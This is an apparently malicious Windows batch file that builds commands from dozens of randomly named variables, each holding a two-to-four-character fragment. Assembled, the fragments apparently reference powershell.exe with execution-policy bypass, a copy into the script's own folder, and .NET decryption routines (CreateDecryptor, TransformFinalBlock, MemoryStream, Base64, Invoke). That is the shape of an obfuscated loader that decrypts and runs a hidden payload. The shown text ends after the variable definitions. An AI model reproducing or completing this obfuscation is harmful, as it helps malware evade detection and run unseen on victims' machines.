@echo off
set "sQoNSbgTvt= C"
set "NmTqCCcGbr=Sy"
set "rZRlmUTRGX=ll"
set "ZlxVFQMJHY=we"
set "JdDwulNbTi= /"
set "QcuipTjRAt=nd"
set "FqmAENdNpZ=\v"
set "efWzzROHAx=do"
set "HrEDXOGbzC=ws"
set "SwoppayXKB=em"
set "dagjEKAPPo=Po"
set "UdTgGXQVDc=st"
set "XgCzwrYEaC=in"
set "FxOqkeUuzc=:\"
set "KxFtvCdkmi=co"
set "wkOTDiKREK=ow"
set "zxKnxHEgHh=xe"
set "avwaHYyLgY=0\"
set "KWfxzdZMUO=he"
set "mtSdtAnyFv=y "
set "FzhPOKkdAG=py"
set "LLtEctKETM=po"
set "nTDNXkUmTF=rs"
set "prGqnxhJfk=he"
set "lMxNWZiqOY=we"
set "iFOhlDoTZf=Wi"
set "iAnhEoHZnT=1."
set "YpXtTFCZCH=rS"
set "RdomFjqyqa=32"
set "PQDxyNcgCo=s\"
set "fePnPMXxQA=\W"
set "DcgBTOYAuQ=ll"
set "mOehKShGGR=.e"
set "ieykFaKKHO= %~dp0"
set "rGuXiVWyGk=cd"
set "chBWLMVMkJ=$CzN"
set "fQGXZBGmPz=mory"
set "HPAdUpwKrd=esMa"
set "jpGXeWuuLi=Syst"
set "LfKVFzMTUl=fT ="
set "VfNGNUNRmR=rity"
set "kqTXeufNUz=em.C"
set "OKQloedZcW=se()"
set "XCJPjwtIJs=F'[-"
set "BbayNSHlzy=REEU"
set "AtgnkOwqUR= [Sy"
set "voOLCwjeMk=..-1"
set "hQdVTtsRJF=vert"
set "JZCgcbafLD=tS46"
set "QLBflSWcel=REEU"
set "LXhPUqMHZt=-joi"
set "AWPTCOJxeK=y.Ci"
set "dTkZbtJmzf=rofi"
set "zcztLsxSsa=6] -"
set "kKGNnQJerH=pStr"
set "xXlyYNLfls=y.Pa"
set "miUGGCptMv=EU.I"
set "gEPbbZBmaK=lit("
set "AWYFKahkdS=)) {"
set "MFQzWMhrGs= = $"
set "aJfyaAZozd=le  "
set "RHAKNFCcJR=iREE"
set "utwatHtdBT=pose"
set "bFOKMvwXTo=ke($"
set "TajWTIDApw=.Cre"
set "CVzIQUPpyS=ew-O"
set "IJaywPjCqi=.Len"
set "HxzyJvBgaP=esaB"
set "mTtIcxSBZi=REEU"
set "jgbgbojnKT=form"
set "psnDhLPLIo=bypa"
set "qDgtGaOapI=cvJO"
set "QnjTwWxXir=-Obj"
set "bpzQBLcelD=736u"
set "DvZhdgZojH=Disp"
set "vdVswTKYgu=; };"
set "qafKWDomiL=T = "
set "GDMZJIeJqa=d;$i"
set "UvHVOEAsrp=tion"
set "JqaBBecrZu=($Yd"
set "hFQbbtFjAQ=ateD"
set "HXLHYmYKyp='txe"
set "vTEtXtYWWG=7Yiv"
set "QyBEljXOrr=-joi"
set "jOmsdILwzh=);$b"
set "vEpSIKUDlH=);$m"
set "KpwRYnXZDg=gMod"
set "DuHFleNrlY=('%*'"
set "XjHtkXQedn=] -j"
set "WKVfyLUcbv=trea"
set "oJodxEuiAw=y.Cr"
set "aCzUpRTwyg=XV, "
set "hIhPdOmkOt=[]] "
set "srfYyMBjZb=Fina"
set "EhZmnvkUiy=;$xP"
set "loDlkwrGYi=VF);"
set "WUuNkKLfYr=Mode"
set "CSAGWEscVb=iron"
set "nYCsQNUvuE=ct S"
set "TZRySFPdVK= = ["
set "RTJXfpKPcY=ZYYc"
set "ahprcQPswJ=y]::"
set "GHIzzfptsR=LsEX"
